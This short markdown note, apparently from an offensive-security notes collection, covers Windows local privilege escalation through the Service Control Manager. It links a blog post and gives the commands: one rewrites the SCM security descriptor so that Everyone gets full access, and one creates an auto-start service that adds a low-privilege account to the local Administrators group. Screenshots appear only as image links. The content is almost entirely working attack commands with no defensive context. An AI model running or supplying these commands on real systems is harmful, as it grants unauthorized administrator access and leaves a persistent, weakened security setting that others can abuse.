# L-P-E

### Least/Low/Local (Privilege) Escalation/Elevation

[PrivEsc: Abusing the Service Control Manager for Stealthy &amp; Persistent LPE - 0xv1n](https://0xv1n.github.io/posts/scmanager/)

```sc sdset scmanager D:(A;;KA;;;WD)```

```sc sdshow scmanager```

![image](https://user-images.githubusercontent.com/58542375/224455112-2e22ffed-8a8a-4cf8-b081-10927ddc6856.png)

![image](https://user-images.githubusercontent.com/58542375/224455362-b51a8c4e-463b-4c98-a1ce-7529c8ce1b58.png)

```sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators lowpriv /add" start= auto```

![image](https://user-images.githubusercontent.com/58542375/224455468-3f9c42a4-6477-49c0-bae3-45ba57842782.png)

![image](https://user-images.githubusercontent.com/58542375/224455542-9ae4a98b-8ee4-40af-84c6-78219462e495.png)
